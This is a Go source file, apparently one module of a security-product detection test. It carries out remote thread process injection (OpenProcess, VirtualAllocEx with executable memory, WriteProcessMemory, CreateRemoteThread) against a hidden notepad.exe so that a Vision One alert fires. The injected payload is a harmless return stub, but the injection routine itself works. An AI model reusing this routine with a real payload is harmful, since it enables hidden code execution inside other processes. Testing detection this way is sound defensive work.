//go:build windows

package main

// Module 4: Process Injection Simulation
// MITRE: T1055.002 - Portable Executable Injection
// Triggers: Vision One Suspicious Behavior (process injection alert)
//
// Safe payload: x64 opcodes 0x48 0x31 0xC0 0xC3
//
//	xor rax, rax  → clear RAX (return value = 0)
//	ret           → return immediately
//
// The injected thread starts, returns 0, and exits cleanly. No harmful operation.
// Trend Micro records the OpenProcess → VirtualAllocEx → WriteProcessMemory →
// CreateRemoteThread API sequence, which is the detection trigger.

import (
	"fmt"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess     = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx  = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMem = kernel32.NewProc("WriteProcessMemory")
	procCreateRemThread = kernel32.NewProc("CreateRemoteThread")
	procWaitSingleObj   = kernel32.NewProc("WaitForSingleObject")
	procCloseHandle     = kernel32.NewProc("CloseHandle")
)

const (
	processAllAccess   = 0x1F0FFF
	memCommitReserve   = 0x00003000 // MEM_COMMIT | MEM_RESERVE
	pageExecReadWrite  = 0x40       // PAGE_EXECUTE_READWRITE
	waitInfinite       = 0xFFFFFFFF
)

func injectProcess() {
	logf("MODULE 4: Process Injection Simulation")
	logf("  Technique: T1055.002 - Remote Thread Injection")

	// Spawn a throwaway target process (hidden window)
	cmd := exec.Command("notepad.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		// Fallback: try mspaint
		cmd = exec.Command("mspaint.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err2 := cmd.Start(); err2 != nil {
			logf("  Could not start target process: %v / %v", err, err2)
			return
		}
	}

	pid := cmd.Process.Pid
	logf("  Target PID: %d (notepad.exe)", pid)
	time.Sleep(500 * time.Millisecond)

	// Safe x64 thread payload:
	//   48 31 C0  →  xor rax, rax   (return value = 0)
	//   C3        →  ret             (thread exits cleanly)
	payload := []byte{0x48, 0x31, 0xC0, 0xC3}

	// Step 1: OpenProcess
	hProc, _, lastErr := procOpenProcess.Call(
		processAllAccess,
		0,
		uintptr(pid),
	)
	if hProc == 0 {
		logf("  OpenProcess failed: %v (run as Administrator)", lastErr)
		cmd.Process.Kill()
		return
	}
	defer procCloseHandle.Call(hProc)
	logf("  OpenProcess       : handle 0x%X ✓", hProc)

	// Step 2: VirtualAllocEx
	addr, _, lastErr := procVirtualAllocEx.Call(
		hProc,
		0,
		uintptr(len(payload)),
		memCommitReserve,
		pageExecReadWrite,
	)
	if addr == 0 {
		logf("  VirtualAllocEx failed: %v", lastErr)
		cmd.Process.Kill()
		return
	}
	logf("  VirtualAllocEx    : 0x%X (%d bytes, RWX) ✓", addr, len(payload))

	// Step 3: WriteProcessMemory
	var written uintptr
	ret, _, lastErr := procWriteProcessMem.Call(
		hProc,
		addr,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		logf("  WriteProcessMemory failed: %v", lastErr)
		cmd.Process.Kill()
		return
	}
	logf("  WriteProcessMemory: wrote %d bytes ✓", written)

	// Step 4: CreateRemoteThread (the detection trigger)
	var tid uint32
	hThread, _, lastErr := procCreateRemThread.Call(
		hProc,
		0,
		0,
		addr,
		0,
		0,
		uintptr(unsafe.Pointer(&tid)),
	)
	if hThread == 0 {
		logf("  CreateRemoteThread failed: %v", lastErr)
		cmd.Process.Kill()
		return
	}

	logf("  CreateRemoteThread: TID %d @ 0x%X ✓", tid, addr)
	logf("  Payload: xor rax,rax; ret  (thread returns 0 immediately)")

	// Wait for thread completion
	procWaitSingleObj.Call(hThread, 2000)
	procCloseHandle.Call(hThread)

	time.Sleep(500 * time.Millisecond)
	cmd.Process.Kill()

	logf("  Target process killed")
	logf(fmt.Sprintf("  API sequence logged: OpenProcess→VirtualAllocEx→WriteProcessMemory→CreateRemoteThread"))
	logf("  Expect: Vision One T1055.002 process injection alert")
}
